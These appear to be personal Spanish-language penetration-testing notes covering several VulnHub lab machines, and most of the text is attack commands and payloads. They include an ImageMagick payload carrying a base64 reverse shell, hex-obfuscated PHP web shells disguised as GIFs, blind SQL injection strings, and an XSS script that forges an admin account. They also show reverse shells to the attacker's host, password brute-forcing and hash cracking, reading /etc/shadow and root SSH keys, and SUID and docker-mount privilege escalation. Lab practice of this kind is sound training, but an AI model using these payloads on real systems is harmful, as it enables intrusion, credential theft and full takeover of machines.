
----
## Imagemagick - vulhub github

SImplemente subiomos un archivo malicioso después de haber echo fuzzing con extensiones de archivo a ver cuále sacepta con esta wordlist -->https://github.com/maverickNerd/wordlists/blob/master/files/common-files.txt

Subimos este código 

`push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjEvODc3NyAwPiYx | base64 -d | bash`"||id " )'
pop graphic-context`

- Dónde lo que hay en base64 es
`/bin/bash -i >& /dev/tcp/172.19.0.1/8777 0>&1`

Así que utilizaremos echo -n para que no haya saltos de línea y lo meteremos al código anterior

`echo -n "/bin/bash -i >& /dev/tcp/172.19.0.1/8777 0>&1" | base64`

Nos ponemos en escucha, subimos archivo y powned
![[Pasted image 20250309173028.png]]

## FTP Vulnerable 

- sudo nmap -sVC -p21 127.0.0.1

Probamos a reventar la passwd suponiendo que nos sabemos el user

hydra -l sergio -P passwords.txt ftp://127.0.0.1 -t 15
## IMF

- [Sitio de la ova](https://www.vulnhub.com/entry/imf-1,162/)

- Venga hacemos recon
```bash
sudo arp-scan --localnet --ignoredup -Ieth0
sudo netdiscover -r 192.168.1.148
sudo nmap -sS -sU -Pn -p- -T5 --min-rate=5000 -v 192.168.1.148
sudo nmap -sVC -Pn -p80 -T5 --min-rate=5000 -v 192.168.1.148
gobuster dir -u http://192.168.1.148/ -w /usr/share/wordlists/dirb/common.txt 
```


```nmap
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: IMF - Homepage
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 08:00:27:36:C1:88 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```FLAG
 flag1{YWxsdGhlZmlsZXM=) --> allthefiles
```

- Mirando  source code encuentro esta cadena
```FLAG
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
```

- Nos lleva a un login en l que pruebo **Type Juggling** sin hash mágico que empieza por 0
```burp
user=rmichaels&pass[]=ñañañaña
```

```FLAG
flag3{Y29udGludWVUT2Ntcw==}
```
- Iba por este SQLI, cuando es correcto pone under construction
```burp
http://192.168.1.148/imfadministrator/cms.php?pagename=upload' union select substring(database(),1,1)='a-- -
=disavowlist'or+length(database())>%3d'5--
```
- Sacamos la BD admin
```Burp
savowlist'+or+substring(database(),§1§,1)%3d'§a§-- -
```
- Meto a intruder la siguiente peticion y resuelve
```burp
home'or+substring((select+group_concat(schema_name)+from+information_schema.schemata),§1§,1)='§a§ 
```

- BD extraídas
>information_schema
admin
mysql
performance
schema
sys

- Saco las tablas
```burp
me'+or+substring((select+group_concat(table_name)+from+information_schema.tables+where+table_schema="admin"),§1§,1)='§i§
```
- Tablas extraídas
>pages

- Saco columnas 
```
me'+or+substring((select+group_concat(column_name)+from+information_schema.columns+where+table_name="pages"),20,1)='a 
```

>id
>pagename
>pagedata

- Vamos a scar la info , en la wordlist puse special chars
> **Pagename**
disavowlist
home
tutorials-incomplete
upload

- Visito `http://192.168.1.148/imfadministrator/cms.php?pagename=tutorials-incomplete`
- Encuentro flag **flag4{uploadr942.php}** y visito `http://192.168.1.148/imfadministrator/uploadr942.php`

- File upload
```php
<?php
# "system" word in hexadecimal
# 73 79 73 74 65 6D
# \x73\x79\x73\x74\x65\x6D
"\x73\x79\x73\x74\x65\x6D"($_GET['cmd']);
?>
```

```Burp
Content-Disposition: form-data; name="file"; filename="cmdhex.gif"
Content-Type: image/gif

GIF89a;
<?php
# "system" word in hexadecimal
# 73 79 73 74 65 6D
# \x73\x79\x73\x74\x65\x6D
"\x73\x79\x73\x74\x65\x6D"($_GET['cmd']);
?>
```

```bash
script /dev/null -c bash
Ctrol + Z
stty raw -echo ; fg # llevr netcat a 2 plano
reset xterm # o el visor que utilices
stty size # ver size de nuestra terminal
export TERM=xterm
export SHELL=bash
stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
```

- Flag flag5{YWdlbnRzZXJ2aWNlcw\==} -->  agentservices tendremos que encontrar este archivo y saber que es

```bash
www-data@imf:/$ find / -name  agent 2>/dev/null
/usr/local/bin/agent
/etc/xinetd.d/agent
```

- Encontramos el binario agent corriendo y en el **PATH**, ejecutado por root
- Ejecutamos y nos pide id,nos lo pasamos al PC y lo abrimos con ghidra, ejecuto **agent** para ver su comportamiento
>Comportamiento del programa

1. Si falla, se convierte a 0
```C#
if (pcVar1 == (char *)0x0) {
    uVar2 = 0xffffffff;
}
```
1. si no falla la variable local_22 se compara con local_28 --> ahí puede que etsé el agent id
- Encuentro esta línea `asprintf(&&local_28,"%i",48093572);` 
- Encuentro un manejo de pocos bytes en la 3º función
```C
char * report(void)

{
  char local_a8 [164];
```

- Printeo 200 A
```python
python3 -c 'print("A"*200)'
```

```gdb-peda

gdb ./agent -q
pattern offset $eip
python3 -c 'print("A"*? + "B"*4)'

# Vemos si hay ASLR
cat /proc/sys/kernel/randomize_va_space

# te dice dónde se escribe el ESP, si tiene ASLR se escribirá en distintas posiciones de memoria
ldd binario 
for i in $(seq 1 20); do ldd binario | grep libc | awk 'NF{print $NF}' | tr -d '( )'; done

# lista 100 posiciones de memoria 200 bytes antes del esp
gdb-peda x/100wx $esp-200 

# LLamaremos a un registro anterior en eax: ret2reg
gdb-peda x/16wx $eax-4
```

## PokerMax
-----
[Laboratorio](https://www.vulnhub.com/entry/casino-royale-1,287/)

------

```bash
nmap -sS -sU  --min-rate=5000 -T5 -v -Pn -p- 192.168.1.149 -oG nmapeado
sudo nmap -sVC -p21,25,80,8081 -v 192.168.1.149 
sudo nmap --script=http* -p80,8081 -v 192.168.1.149
```


- Vemos pokermax en , y buscamos en searchsploit
http://192.168.1.149/install/


- Consola
```HTTP-console
javascript:document.cookie = "ValidUserAdmin=admin";
```

- http://192.168.1.149/pokeradmin/configure.php
```Burp
admin' or 1=1-- - pass=edwsw
```

- Hay una ruta y nos chiva que los mensajes que tenemos que enviar por telnet son como abajo
- Encontramos el exploit **php/webapps/35301.html**, que nos dice como hacer csrf
1. Creamos HTML con e
>admin:raise12million
```bash
 telnet 192.168.1.149 25
Trying 192.168.1.149...
Connected to 192.168.1.149.
Escape character is '^]'.
220 Mail Server - NO UNAUTHORIZED ACCESS ALLOWED Pls.
MAIL FROM:sexo
250 2.1.0 Ok
RCPT TO:valenka
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject:valenka
Mira prima, esto es para ti
http://192.168.1.135/index.html

.
250 2.0.0 Ok: queued as ED0B8BAC1
quit

```

- Valenka no visita, vamos a intentar hacer un sqli de su passwd para poder ejecutar en la ruta que hemos subido el .php3(no se si valenka puede llegar a esa ruta)
- Tras subir el archivo **.php3** nos da una reverse shell
- Desde /var/www/html buscamos un archivo config el cuál nos puede dar credenciales
- Cuándo tenemos **phpmyadmin**, buscar por archivos **config**
> Encontraremos credenciales en algunos sitios para pivotar al user  **valenka**
```bash
find . -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
```

```bash
strings binario al primer binario que encontramos
```

- Vemos que intenta ejecutar algo que no tiene ruta absoluta
>/bin/bash **run.sh**

- Lo creamos donde queramos
```bash
nano run.sh
#!/bin/bash
bash -p
```

- Fuera del script ejecutamos el binario con **permisos de suid y sgid**

## Symfonos
-----
[Laboratorio:](https://www.vulnhub.com/entry/casino-royale-1,287/)

------

>Pendiente siempre de la **esteganografía** en las photos

- Fuzzing 
```bash
wfuzz -c --hc=404,400,403,500 -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt   http://192.168.1.134/FUZZ
```

1. http://192.168.1.134/posts/
2. http://192.168.1.134/flyspray/

```
searchsploit flyspray
```

- Damos con un XSS que da lugar a un CSRF
1. En el parámetrorealname de /myprofile ponemos:
2. nano paf.js
```JS
var tok = document.getElementsByName('csrftoken')[0].value;
var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'

txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

>`"><script src="http://192.168.1.135/paf.js"></script>`

- Eso crea un user y password en  --> http://192.168.1.134/flyspray/

Nos hemos bajado los repositorios y estamos husmeando entre los directorios y vamos descubriendo rutas y de qué manera podemos consultarla

```bash
 curl -s -X GET http://192.168.1.134:5000/ls2o4g/v1.0/auth/check -b '_csrf=au_cMW4sJvUbFlzVgqp9eRBY9wY6MTc0NTg4MzExMzExNDQxNjI5Ng;i_like_gitea=5eb789f271ca02f9;lang=en-US' 
                                                                                                                    
curl -s -X GET http://192.168.1.134:5000/ls2o4g/v1.0/ping -b '_csrf=au_cMW4sJvUbFlzVgqp9eRBY9wY6MTc0NTg4MzExMzExNDQxNjI5Ng;i_like_gitea=5eb789f271ca02f9;lang=en-US'    
{"message":"pong"} 
```

- En el fichero **auth/auth.ctrl.go**, descubrimos los campos username y password en el login
```bash
curl -s -X POST "http://192.168.1.134:5000/ls2o4g/v1.0/auth/login"  -H "Content-Type: application/json" -d '{"username": "achilles", "password": "h2sBr9gryBunKdF9"}' | jq
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDY0OTA0MjUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.DmiO6mJGxwo-PweKzBMS4GzwFztJe4gL3sI46KMZjDU",                           
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}

```
- Modificamos el server principal **192.168.1.134:80** desde la **API**
``` bash
 curl -s -X PATCH "http://192.168.1.134:5000/ls2o4g/v1.0/posts/1"  -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDY0OTA0MjUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.DmiO6mJGxwo-PweKzBMS4GzwFztJe4gL3sI46KMZjDU' -d '{"text": "Tu maimai está en mi casa"}' | jq
```
- Subimos archivo 
```bash
curl -s -X PATCH "http://192.168.1.134:5000/ls2o4g/v1.0/posts/1" \
  -H "Content-Type: application/json" \
  -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDY0OTA0MjUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.DmiO6mJGxwo-PweKzBMS4GzwFztJe4gL3sI46KMZjDU" \
  -d "{\"text\": \"file_put_contents('pruebilla.txt', 'Prueba primo')\"}" | jq
```

- Consultamos http://192.168.1.134/posts/pruebilla.txt
- Subimos archivos de estas maneras
1. 
```bash
curl -s -X PATCH "http://192.168.1.134:5000/ls2o4g/v1.0/posts/1" \
  -H "Content-Type: application/json" \
  -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDY0OTA0MjUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.DmiO6mJGxwo-PweKzBMS4GzwFztJe4gL3sI46KMZjDU" \
  -d "{\"text\": \"file_put_contents('archivazo.php', base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4='))\"}" | jq
```
2. si no chusca le metemos un **$** ahí en el **-d**
```bash
curl -s -X PATCH "http://192.168.1.134:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDY0OTA0MjUsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.DmiO6mJGxwo-PweKzBMS4GzwFztJe4gL3sI46KMZjDU' -d $'{"text": "file_put_contents(\'sexo.php\', base64_decode(\'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=\'))\"}' | jq
```

- Después de subir los archivos **pafeto.php** y **sexo.php**, pues ejecuto comandos
```URL
http://192.168.1.134/posts/pafeto.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.135/443%200%3E%261%22
```
- Atacante 
```bash
nc -nvlp 443
```

```bash
script /dev/null -c bash
Ctrol + Z
stty raw -echo ; fg # llevr netcat a 2 plano
reset xterm # o el visor que utilices
stty size # ver size de nuestra terminal
export TERM=xterm
export SHELL=bash
stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
```

```bash
#Veo que podemos utilizar go como sudo 
sudo -l -l 
```

- vim **estesi.go**
```go
package main

import (
 "fmt"
 "os"
 "os/exec"
)

func main() {
 cmd := exec.Command("/bin/bash", "-p") #Alternativa("chmod","u+s" ,"/bin/bash")
 cmd.Stdin = os.Stdin
 cmd.Stdout = os.Stdout
 cmd.Stderr = os.Stderr

 err := cmd.Run()
 if err != nil {
  fmt.Println("Error:", err)
 }
}
```

```bash
sudo /usr/local/go/bin/go run estesi.go 
#En caso de ser la segunda
bash -p
```

## Presidential

----

```bash
gobuster dir -u http://192.168.1.139/ -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash | grep -v "400"
/cgi-bin/             (Status: 403) [Size: 210]
/assets/              (Status: 200) [Size: 1505]
/icons/               (Status: 200) [Size: 74409]

gobuster dir -u http://votenow.local/ -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x php.bak,php,tar,html,htm,txt,pdf -t 20| grep -v "400"
```


- encontramos credens en **/config.bak**
- Me logeo en **phpmyadmin**
- Busco version y exploit de phpmyadmin

```bash
 searchsploit -x php/webapps/50457.py
```
- El script te dice que hagas lo siguiente, es donde puedes ver los comandos que se ejecutan
```URL
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_uqs28p0ggnvf8hu8s160bu0egns0a6g8
```


- Apartado de SQL, haciendo consultas nos encontramos **admin:$2y\$12\$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i**
```
select '<?php system("whoami") ?>';
select '<?php system("bash -i >& /dev/tcp/192.168.1.135/443 0>&1"); ?>';
```
- Recargamos la página donde tenemos la ruta de atrás con el 'session'
- En la máquina

```bash
nc -nvlp 443
script /dev/null -c bash
Ctrol + Z
stty raw -echo ; fg # llevr netcat a 2 plano
reset xterm # o el visor que utilices
stty size # ver size de nuestra terminal
export TERM=xterm
export SHELL=bash
stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
```


- Cuando petas una **passwd** se guarda en el archivo **.jhon/jhon.pot** que son los potfiles
1. Miramos qué formatos serían con **hashcat** y **john**
```bash
hashid  -m -j '$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i'
```

- Con el número de hash que nos dieron lo pasamos por **hashcat**
```bash
sudo john --wordlist=rockyoureducido.txt --format=bcrypt hash.txt
sudo hashcat -a 0 -m 3200 -o crack.txt hash.txt rockyoureducido.txt
cat crack.txt
```

- Para reducir una wordlist
```
grep -n "Stella$" /usr/share/wordlists/rockyou.txt 
sed -n '200,300p' /usr/share/wordlists/rockyou.txt >> rockyoureducido.txt
```

- Observo capabilities siempre fijarnos en **ep** que ejecuta con **privs elevados**
```bash
getcap -r / 2>/dev/null 
/usr/bin/tarS = cap_dac_read_search+ep
```
- **tarS** es una funcionalidad alternativa de **tar** en esta máquina
- Como podemos ejecutarlo con permisos elevados, podemos empaquetar lo que queremos, inclusio ver el **/etc/shadow**, ver hashes y petar alguno como el de **root**
- Buscamos con intención si existe una clave privada para root, para acceder por **ssh sin password**
```bash
tar -cvf /etc/shadow /etc/shadow
tar -cvf id_rsa /root/.ssh/id_rsa
cat id_rsa
#Ver si la clave es válida
ssh-keygen -l -f id_rsa
```

- Nos la llevamos a kali
```bash
ssh -i id_rsa -p 2082 root@votenow.local
```

## Infovore

	- filtramos por **disable_functions** en el archivo **info.php**
- Filtrar por user en **info.php**
- Filtrar por file_uploads: **On** --> buscar en google para encontrar la vuln de **LFI**
>Podemos ver que funciones o comandos están deshabilitados

- Recon
```bash
wfuzz -c --hc=404,400,403,500 -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/common.txt   http://192.168.1.141/FUZZ 
wfuzz -c --hl=136 --hc=404,400,403,500 -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt   http://192.168.1.141/index.php?FUZZ=/etc/passwd
```

> Encontramos http://192.168.1.141/index.php?filename=/etc/passwd
> Eso es que podemos visitar algún archivo

- subida de archivos desd info.php con **boundary**, ponemos los límites con ese etxto "esteesellimite"
```BURP
Content-Type: multipart/form-data; boundary=----esteesellimite
Content-Length: 186

------esteesellimite
Content-Disposition: form-data; name="file"; filename="sexe.txt"
Content-Type: plain/text

sexazo
------esteesellimite
```

- Buscamos por sexe.txt y nos encontramos un archivo -->    [tmp_name] =&gt; **/tmp/phpGFi9Kc**
>Vemos esto en el apartado --> $\_FILES['file']
- Significa que tiene nombre temporal por lo que necesitaríamos visitarlo a la vez que se crea

>con este script lo logramos [phpinfoLFI](https://insomniasec.com/downloads/publications/phpinfolfi.py)
>Aunque lo hemos modificado para que quede bien con todos los parámetros [phpinfoLfiRcelocal](D:\Training\eJPTv2\Payloads\LfiRce.py)

- Ganamos acceso pero resulta que estamos en un docker
```bash
hostname
hostname -I
cat /proc/net/arp 
arp -n
```

- Encontramos en **~/** un archivo .oldkeys.tgz y lo descomprimimos, encontramos una clave ssh
- **ssh2john** se encarga de convertirla a hash
```bash
ssh2john id_rsa > hash
sudo john --wordlist=rockyoureducido.txt --format=SSH hash  
root:choclate93
```
- Para saber si un proceso por un puerto está corriendo PJ: 22
```bash
echo '' > /dev/tcp/ip/22
```


- Entonces vemos la carpeta **.ssh** y vamos a ver cuáles son sus **known_hosts**
```bash
cat known_hosts 
ssh admin@192.168.150.1  
#Entramos con la misma password choclate93
```

- Hemos hecho es ssh a la máquina real pero por su **interfaz de docker**
- Pasamos a la escalada de privilegios de **root**
```bash
#Vemos a qué grupos pertenecemos o qué podemos hacer
sudo -l -l
id
groups
```

-  Pertenecemos a docker hacemos **montura**
```bash
docker images
docker ps -a
docker run -dit -v /:/mnt/root --name privesc ubuntu
docker exec -it privesc bash
cd /mnt/root/bin
chmod u+s bash
exit
#Dentro de la máquina veo si la bash tiene u+s
ls -la /bin/bash
bash -p
```


## Máquinas varias

#### Intentando partir desde mysql
```bash
mysql> select load_file('/etc/passwd');
mysql> select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php";

# Leo lo que s epodía leer por el navegador, por aquí a ver is hay algo diferente
mysql> select load_file('/var/www/html/index.html');

# Veo que en uno d elos directorio si me lo deja subir
mysql> select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html//M3t4LL1c@/shell.php";
```